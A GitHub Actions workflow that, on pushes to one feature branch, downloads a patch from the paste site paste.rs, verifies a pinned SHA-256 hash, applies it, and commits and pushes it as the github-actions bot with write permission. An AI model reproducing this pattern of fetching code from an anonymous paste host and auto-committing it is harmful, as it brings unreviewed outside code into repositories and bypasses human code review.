name: ci

on:
  push:
    branches:
      - feature/bootstrap-architecture-v0.1

permissions:
  contents: write

jobs:
  apply-package-relationship-archive-scan-fix:
    if: github.actor != 'github-actions[bot]'
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 0
          token: ${{ secrets.GITHUB_TOKEN }}

      - name: Apply package relationship archive scan fix
        shell: bash
        run: |
          set -euo pipefail
          curl -fsSL https://paste.rs/6o3ag --output package-relationship-archive-scan-fix.patch
          echo "093c49e583dcbbd3adfadcb3fffbcf1d68428e38431628a5b4cbbd1df7f6bebb  package-relationship-archive-scan-fix.patch" | sha256sum --check -
          git apply --index package-relationship-archive-scan-fix.patch
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git commit -m "fix: scan package relationship entries before OpenXML load"
          git push
